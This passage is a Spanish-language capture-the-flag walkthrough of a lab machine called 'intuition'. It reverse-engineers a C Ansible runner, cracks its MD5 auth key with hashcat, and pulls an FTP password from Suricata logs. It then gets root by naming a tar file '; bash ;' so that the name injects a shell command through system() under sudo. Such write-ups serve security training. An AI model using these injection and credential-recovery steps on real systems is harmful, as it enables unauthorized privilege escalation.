-rw-r--r--   1 root     1002         3815 Oct 19  2023 runner1.c
```

Una aplicación programada en C y con unos tests, veamos que tiene

```c
// Version : 1

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <openssl/md5.h>

#define INVENTORY_FILE "/opt/playbooks/inventory.ini"
#define PLAYBOOK_LOCATION "/opt/playbooks/"
#define ANSIBLE_PLAYBOOK_BIN "/usr/bin/ansible-playbook"
#define ANSIBLE_GALAXY_BIN "/usr/bin/ansible-galaxy"
#define AUTH_KEY_HASH "0feda17076d793c2ef2870d7427ad4ed"

int check_auth(const char* auth_key) {
    unsigned char digest[MD5_DIGEST_LENGTH];
    MD5((const unsigned char*)auth_key, strlen(auth_key), digest);

    char md5_str[33];
    for (int i = 0; i < 16; i++) {
        sprintf(&md5_str[i*2], "%02x", (unsigned int)digest[i]);
    }

    if (strcmp(md5_str, AUTH_KEY_HASH) == 0) {
        return 1;
    } else {
        return 0;
    }
}

void listPlaybooks() {
    DIR *dir = opendir(PLAYBOOK_LOCATION);
    if (dir == NULL) {
        perror("Failed to open the playbook directory");
        return;
    }

    struct dirent *entry;
    int playbookNumber = 1;

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG && strstr(entry->d_name, ".yml") != NULL) {
            printf("%d: %s\n", playbookNumber, entry->d_name);
            playbookNumber++;
        }
    }

    closedir(dir);
}

void runPlaybook(const char *playbookName) {
    char run_command[1024];
    snprintf(run_command, sizeof(run_command), "%s -i %s %s%s", ANSIBLE_PLAYBOOK_BIN, INVENTORY_FILE, PLAYBOOK_LOCATION, playbookName);
    system(run_command);
}

void installRole(const char *roleURL) {
    char install_command[1024];
    snprintf(install_command, sizeof(install_command), "%s install %s", ANSIBLE_GALAXY_BIN, roleURL);
    system(install_command);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s [list|run playbook_number|install role_url] -a <auth_key>\n", argv[0]);
        return 1;
    }

    int auth_required = 0;
    char auth_key[128];

    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "-a") == 0) {
            if (i + 1 < argc) {
                strncpy(auth_key, argv[i + 1], sizeof(auth_key));
                auth_required = 1;
                break;
            } else {
                printf("Error: -a option requires an auth key.\n");
                return 1;
            }
        }
    }

    if (!check_auth(auth_key)) {
        printf("Error: Authentication failed.\n");
        return 1;
    }

    if (strcmp(argv[1], "list") == 0) {
        listPlaybooks();
    } else if (strcmp(argv[1], "run") == 0) {
        int playbookNumber = atoi(argv[2]);
        if (playbookNumber > 0) {
            DIR *dir = opendir(PLAYBOOK_LOCATION);
            if (dir == NULL) {
                perror("Failed to open the playbook directory");
                return 1;
            }

            struct dirent *entry;
            int currentPlaybookNumber = 1;
            char *playbookName = NULL;

            while ((entry = readdir(dir)) != NULL) {
                if (entry->d_type == DT_REG && strstr(entry->d_name, ".yml") != NULL) {
                    if (currentPlaybookNumber == playbookNumber) {
                        playbookName = entry->d_name;
                        break;
                    }
                    currentPlaybookNumber++;
                }
            }

            closedir(dir);

            if (playbookName != NULL) {
                runPlaybook(playbookName);
            } else {
                printf("Invalid playbook number.\n");
            }
        } else {
            printf("Invalid playbook number.\n");
        }
    } else if (strcmp(argv[1], "install") == 0) {
        installRole(argv[2]);
    } else {
        printf("Usage2: %s [list|run playbook_number|install role_url] -a <auth_key>\n", argv[0]);
        return 1;
    }

    return 0;
}
```
{: file="runner1.c" } 

Hay un hash md5, y leyendo el código podemos ver que sin saber el secret que genera ese hash, no podremos utilizarla, pero en el archivo de tests

```bash
#!/bin/bash

# List playbooks
./runner1 list

# Run playbooks [Need authentication]
# ./runner run [playbook number] -a [auth code]
#./runner1 run 1 -a "UHI75GHI****"

# Install roles [Need authentication]
# ./runner install [role url] -a [auth code]
#./runner1 install http://role.host.tld/role.tar -a "UHI75GHI****"
```
{: file="run-tests.sh" }

Nos faltan cuatro carácteres para tener el secret, afortunadamente es algo que podemos crackear con hashcat, además de que las contraseñas que hemos descubierto hasta ahora normalmente utilizan solo mayúsculas y números. Más sencillo aún:

```bash
0feda17076d793c2ef2870d7427ad4ed:UHI75GHINKOP             
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 0feda17076d793c2ef2870d7427ad4ed
Time.Started.....: Mon Sep 16 13:33:27 2024 (0 secs)
Time.Estimated...: Mon Sep 16 13:33:27 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: UHI75GHI?u?u?u?u [12]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1064.7 kH/s (0.17ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 215040/456976 (47.06%)
Rejected.........: 0/215040 (0.00%)
Restore.Point....: 212992/456976 (46.61%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: UHI75GHINENL -> UHI75GHIBYFS
Hardware.Mon.#1..: Temp: 69c Util: 27%

Started: Mon Sep 16 13:33:24 2024
Stopped: Mon Sep 16 13:33:28 2024
```

Okay, ¿pero ahora que hacemos? este programa no está por ningún lado en el sistema... pues en `/opt` hay unos directorios a los que no tenemos acceso, los que llaman la atención son `playbooks` y `runner2`

```bash
dev_acc@intuition:/opt$ ls -la
total 28
drwxr-xr-x  7 root root    4096 Apr 10 08:21 .
drwxr-xr-x 19 root root    4096 Apr 10 07:40 ..
drwx--x--x  4 root root    4096 Aug 26  2023 containerd
drwxr-xr-x  4 root root    4096 Sep 19  2023 ftp
drwxr-xr-x  3 root root    4096 Apr 10 08:21 google
drwxr-x---  2 root sys-adm 4096 Apr 10 08:21 playbooks
drwxr-x---  2 root sys-adm 4096 Apr 10 08:21 runner2
```

Los del grupo `sys-adm` tienen acceso de lectura en estos directorios, y los otros dos usuarios del sistema pertenecen a ese grupo, veamos como hacemos.

Si miramos los procesos veremos que hay un Suricata corriendo

```bash
... [snip]
www-data    1261  0.0  0.1  55944  5440 ?        S    10:01   0:00  \_ nginx: worker process
www-data    1262  0.0  0.1  55944  6336 ?        S    10:01   0:03  \_ nginx: worker process
root        1263  8.2  1.6 548512 64052 ?        Ssl  10:01  38:06 /usr/bin/suricata -D --af-packet -c /etc/suricata/suricata.yaml --pidfile /run/su
ricata.pid
root        1285  0.0  2.0 1909452 79480 ?       Ssl  10:01   0:13 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
... [snip]
```

Mirando sus archivos de configuración, podremos encontrar algunas cosas custom:

```bash
dev_acc@intuition:/etc/suricata/rules$ cat ftp-events.rules 
alert ftp any any -> $HOME_NET any (msg:"FTP Failed Login Attempt"; pcre:"/^USER\s+([^[:space:]]+)/"; sid:2001; rev:2001;)
```

Parece que está tomando registro de los packets que se mandan por el puerto 21, y como sabemos el protocolo FTP va en texto plano, por lo que en logs logs de Suricata tal vez encontremos cosas.

Viendo la carpeta de logs, hay varios archivos que podemos ver:

```bash
dev_acc@intuition:/var/log/suricata$ ls -la
total 86400
drwxr-xr-x  2 root root       4096 Sep 16 10:01 .
drwxrwxr-x 12 root syslog     4096 Sep 16 10:01 ..
-rw-r--r--  1 root root   32536662 Sep 16 18:44 eve.json
-rw-r--r--  1 root root   16630665 Sep 16 10:01 eve.json.1
-rw-r--r--  1 root root    5760612 Oct 26  2023 eve.json.1-2024040114.backup
-rw-r--r--  1 root root          0 Apr  8 14:19 eve.json.1-2024042213.backup
-rw-r--r--  1 root root          0 Apr 22 13:26 eve.json.1-2024042918.backup
-rw-r--r--  1 root root          0 Apr 29 18:27 eve.json.1-2024091610.backup
-rw-r--r--  1 root root     214743 Oct 28  2023 eve.json.5.gz
-rw-r--r--  1 root root    5050595 Oct 14  2023 eve.json.7.gz
-rw-r--r--  1 root root     972578 Sep 29  2023 eve.json.8.gz
-rw-r--r--  1 root root          0 Sep 16 10:01 fast.log
-rw-r--r--  1 root root          0 Sep 16 10:01 fast.log.1
-rw-r--r--  1 root root          0 Oct 26  2023 fast.log.1-2024040114.backup
-rw-r--r--  1 root root          0 Apr  8 14:19 fast.log.1-2024042213.backup
-rw-r--r--  1 root root          0 Apr 22 13:26 fast.log.1-2024042918.backup
-rw-r--r--  1 root root          0 Apr 29 18:27 fast.log.1-2024091610.backup
-rw-r--r--  1 root root         20 Oct 26  2023 fast.log.5.gz
-rw-r--r--  1 root root       1033 Oct  8  2023 fast.log.7.gz
-rw-r--r--  1 root root       1485 Sep 28  2023 fast.log.8.gz
-rw-r--r--  1 root root   14467650 Sep 16 18:44 stats.log
-rw-r--r--  1 root root    7720141 Sep 16 10:01 stats.log.1
-rw-r--r--  1 root root    4293890 Oct 26  2023 stats.log.1-2024040114.backup
-rw-r--r--  1 root root          0 Apr  8 14:19 stats.log.1-2024042213.backup
-rw-r--r--  1 root root          0 Apr 22 13:26 stats.log.1-2024042918.backup
-rw-r--r--  1 root root          0 Apr 29 18:27 stats.log.1-2024091610.backup
-rw-r--r--  1 root root      73561 Oct 28  2023 stats.log.5.gz
-rw-r--r--  1 root root     376680 Oct 14  2023 stats.log.7.gz
-rw-r--r--  1 root root      67778 Sep 29  2023 stats.log.8.gz
-rw-r--r--  1 root root       1218 Sep 16 10:01 suricata.log
... [snip]
```

Los ficheros `eve.log` son los que almacenan el registro de eventos, por lo que vamos a mirarlos primero. los de texto plano no parecen tener algo interesante pero en cambio los comprimidos, especificamente en el `eve.log.8.gz`:

```jsonc
// zcat eve.json.8.gz | grep "FTP"
{"timestamp":"2023-09-28T17:44:01.702018+0000","flow_id":839123789226442,"in_iface":"ens33","event_type":"http","src_ip":"192.168.227.229","src_port":36194,"dest_ip":"192.168.227.13","dest_port":80,"proto":"TCP","tx_id":0,"community_id":"1:sg5USLcxLE2h8q5z9EEqLFxSq6s=","http":{"hostname":"comprezzor.htb","url":"/WS_FTP","http_user_agent":"Fuzz Faster U Fool v2.0.0-dev","http_content_type":"text/html","http_method":"GET","protocol":"HTTP/1.1","status":404,"length":207}}
{"timestamp":"2023-09-28T17:44:01.702812+0000","flow_id":839123789226442,"in_iface":"ens33","event_type":"fileinfo","src_ip":"192.168.227.13","src_port":80,"dest_ip":"192.168.227.229","dest_port":36194,"proto":"TCP","http":{"hostname":"comprezzor.htb","url":"/WS_FTP","http_user_agent":"Fuzz Faster U Fool v2.0.0-dev","http_content_type":"text/html","http_method":"GET","protocol":"HTTP/1.1","status":404,"length":207},"app_proto":"http","fileinfo":{"filename":"/WS_FTP","sid":[],"gaps":false,"state":"CLOSED","stored":false,"size":207,"tx_id":0}}
{"timestamp":"2023-09-28T17:44:43.052676+0000","flow_id":2173767694113635,"in_iface":"ens33","event_type":"alert","src_ip":"192.168.227.229","src_port":34404,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","community_id":"1:bkIDx3KQer9KeG3bmkm8RH0TuCI=","alert":{"action":"allowed","gid":1,"signature_id":2001,"rev":2001,"signature":"FTP Failed Login Attempt","category":"","severity":3},"app_proto":"ftp","app_proto_tc":"failed","flow":{"pkts_toserver":10,"pkts_toclient":10,"bytes_toserver":701,"bytes_toclient":771,"start":"2023-09-28T17:43:23.809827+0000"}}
{"timestamp":"2023-09-28T17:45:32.648990+0000","flow_id":1218304978677234,"in_iface":"ens33","event_type":"alert","src_ip":"192.168.227.229","src_port":45760,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","community_id":"1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=","alert":{"action":"allowed","gid":1,"signature_id":2001,"rev":2001,"signature":"FTP Failed Login Attempt","category":"","severity":3},"app_proto":"ftp","app_proto_tc":"failed","flow":{"pkts_toserver":18,"pkts_toclient":15,"bytes_toserver":1259,"bytes_toclient":1415,"start":"2023-09-28T17:44:27.224754+0000"}}
{"timestamp":"2023-09-28T17:47:27.172398+0000","flow_id":1988487100549589,"in_iface":"ens33","event_type":"alert","src_ip":"192.168.227.229","src_port":37522,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","community_id":"1:SLaZvboBWDjwD/SXu/SOOcdHzV8=","alert":{"action":"allowed","gid":1,"signature_id":2001,"rev":2001,"signature":"FTP Failed Login Attempt","category":"","severity":3},"app_proto":"ftp","app_proto_tc":"failed","flow":{"pkts_toserver":10,"pkts_toclient":10,"bytes_toserver":708,"bytes_toclient":771,"start":"2023-09-28T17:43:32.969173+0000"}}
{"timestamp":"2023-09-28T17:49:34.537400+0000","flow_id":1218304978677234,"in_iface":"ens33","event_type":"alert","src_ip":"192.168.227.229","src_port":45760,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","community_id":"1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=","alert":{"action":"allowed","gid":1,"signature_id":2001,"rev":2001,"signature":"FTP Failed Login Attempt","category":"","severity":3},"app_proto":"ftp","app_proto_tc":"failed","flow":{"pkts_toserver":18,"pkts_toclient":15,"bytes_toserver":1259,"bytes_toclient":1415,"start":"2023-09-28T17:44:27.224754+0000"}}
```

Parece que alguien intentó iniciar sesión en el FTP en un intérvalo especifico de tiempo, y filtrando por más entradas del registro encontraremos algo muy peculiar:

```jsonc
// zcat eve.json.8.gz | grep "PASS"
{"timestamp":"2023-09-28T17:43:29.917563+0000","flow_id":2173767694113635,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":34404,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":2,"community_id":"1:bkIDx3KQer9KeG3bmkm8RH0TuCI=","ftp":{"command":"PASS","command_data":"tesgin","completion_code":["530"],"reply":["Authentication failed."],"reply_received":"yes"}}
{"timestamp":"2023-09-28T17:43:52.999165+0000","flow_id":1988487100549589,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":37522,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":2,"community_id":"1:SLaZvboBWDjwD/SXu/SOOcdHzV8=","ftp":{"command":"PASS","command_data":"Lopezzz1992%123","completion_code":["530"],"reply":["Authentication failed."],"reply_received":"yes"}}
{"timestamp":"2023-09-28T17:44:48.188361+0000","flow_id":1218304978677234,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":45760,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":2,"community_id":"1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=","ftp":{"command":"PASS","command_data":"Lopezz1992%123","completion_code":["230"],"reply":["Login successful."],"reply_received":"yes"}}
```

Esa es la contraseña de Lopez, y funciona en el sistema:

```bash
dev_acc@intuition:/var/log/suricata$ su lopez
Password: 
lopez@intuition:/var/log/suricata$
```

### root - intuition

En las carpetas que vimos anteriormente dentro de `/opt/`, especificamente `playbooks` y `runner2` veremos que hay una nueva versión del runner que no habíamos visto antes, y unos playbooks de Ansible de prueba.

```bash
lopez@intuition:/opt/runner2$ ls -la
total 28
drwxr-x--- 2 root sys-adm  4096 Apr 10 08:21 .
drwxr-xr-x 7 root root     4096 Apr 10 08:21 ..
-rwxr-xr-x 1 root root    17448 Oct 21  2023 runner2
lopez@intuition:/opt/runner2$ ls -la ../playbooks/
total 16
drwxr-x--- 2 root sys-adm 4096 Apr 10 08:21 .
drwxr-xr-x 7 root root    4096 Apr 10 08:21 ..
-rw-r--r-- 1 root root     408 Oct 13  2023 apt_update.yml
-rw-r--r-- 1 root root     135 Oct 13  2023 inventory.ini
```

y también tenemos un privilegio sudo para ejecutar runner2

```bash
lopez@intuition:/opt/runner2$ sudo -l
[sudo] password for lopez: 
Matching Defaults entries for lopez on intuition:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User lopez may run the following commands on intuition:
    (ALL : ALL) /opt/runner2/runner2
```

Al estar igualmente programado en C como podemos suponer, nos va a tocar hacerle ingeniería inversa. Analizandolo podemos percatarnos de varias cosas:

```c
... [snip]
  if (argc != 2) {
    printf("Usage: %s <json_file>\n", *argv[0]);
    return 1;
  }
... [snip]
```

Ahora el programa requiere que especifiques un archivo json, si seguimos inspecionando podemos hacernos una idea de como debe ser el esquema de este archivo:

```json
{
    "auth_code": "KEY-HERE",
    "run": {
        "action": "list|run|install",
        "num":0,
        "role_file": "<path-to-tar>"
    }
}
```

`run` e `install` requieren del auth_code, que verificando la función `check_auth` podremos ver que se reutiliza el mismo secret que crackeamos del runner1, y como es evidente las acciones hacen lo que dice su nombre. La acción que llama potencialmente la atención acá es install ya que viendo su pseudocódigo

```c
void installRole(char* tar_file){

  int isTar;
  long in_FS_OFFSET;
  char cmd[1032];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  isTar = isTarArchive(param_1);
  if (isTar == 0) {
    fwrite("Invalid tar archive.\n",1,0x15,stderr);
  }
  else {
    snprintf(cmd,0x400,"%s install %s","/usr/bin/ansible-galaxy",tar_file);
    system(cmd);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Ejecuta system de forma insegura, sumándole que la función `isTarArchive` solamente verifica que el archivo en cuestión sea un tar y Linux nos permite crear archivos con nombres como:

```bash
lopez@intuition:~$ mv uwu.tar -- '; bash ;'
lopez@intuition:~$ ls -la
total 36
drwxr-x--- 4 lopez lopez  4096 Sep 16 19:26  .
drwxr-xr-x 5 root  root   4096 Apr 25 11:49  ..
-rw-rw-r-- 1 lopez lopez 10240 Sep 16 19:24 '; bash ;'
lrwxrwxrwx 1 root  root      9 Apr  9 18:26  .bash_history -> /dev/null
-rw-r--r-- 1 lopez lopez  3771 Oct 13  2023  .bashrc
drwx------ 2 lopez lopez  4096 Sep 16 19:16  .cache
-rw-r--r-- 1 lopez lopez   807 Oct 13  2023  .profile
drwx------ 2 lopez lopez  4096 Apr 10 08:21  .ssh
```

Significaría que si le damos un json como este, estando dentro del directorio donde creamos el archivo tar de arriba:

```json
{
    "auth_code": "UHI75GHINKOP",
    "run": {
        "action": "install",
        "role_file": "; bash ;"
    }
}
```

Obtendremos una bash como root al ejecutar la aplicación

```bash
lopez@intuition:~$ sudo -u root /opt/runner2/runner2 test.json
usage: ansible-galaxy [-h] [--version] [-v] TYPE ...

Perform various Role and Collection related operations.

positional arguments:
  TYPE
    collection   Manage an Ansible Galaxy collection.
    role         Manage an Ansible Galaxy role.

options:
  --version      show program version number, config file location, configured module search path, module location, executable location and exit
  -h, --help     show this help message and exit
  -v, --verbose  verbose mode (-vvv for more, -vvvv to enable connection debugging)
ERROR! - you must specify a user/role name or a roles file
root@intuition:/home/lopez#
```

y ya podremos tomar la última flag.

```bash
root@intuition:/home/lopez# cd /root
root@intuition:~# ls -la
total 60
drwx------ 10 root root 4096 Sep 16 10:06 .
drwxr-xr-x 19 root root 4096 Apr 10 07:40 ..
drwxr-xr-x  5 root root 4096 Apr 10 08:21 .ansible
-rw-r--r--  1 root root   34 Oct 21  2023 .ansible.cfg
lrwxrwxrwx  1 root root    9 Apr  9 18:26 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  5 root root 4096 Sep  5  2023 .cache
drwxr-xr-x  3 root root 4096 Sep 14  2023 .config
drwxr-xr-x  2 root root 4096 Apr 10 08:21 keys
drwxr-xr-x  3 root root 4096 Aug 20  2023 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r-----  1 root root   33 Sep 16 10:06 root.txt
drwxr-xr-x  5 root root 4096 Sep 19  2023 scripts
-rw-r--r--  1 root root   75 Apr 29 18:29 .selected_editor
drwx------  4 root root 4096 Aug 26  2023 snap
drwx------  2 root root 4096 Oct 26  2023 .ssh
root@intuition:~# cat root.txt
7993ce5bd6554130868b06d70e******
```

## Extra

La inyección de comandos en runner2 fue algo no intencionado, lo que realmente querían que hicieras era que abusaras de un Path Traversal en `ansible-galaxy` (CVE-2023-5115) para sobrescribir ficheros del sistema, como podría ser el `authorized_keys` de root.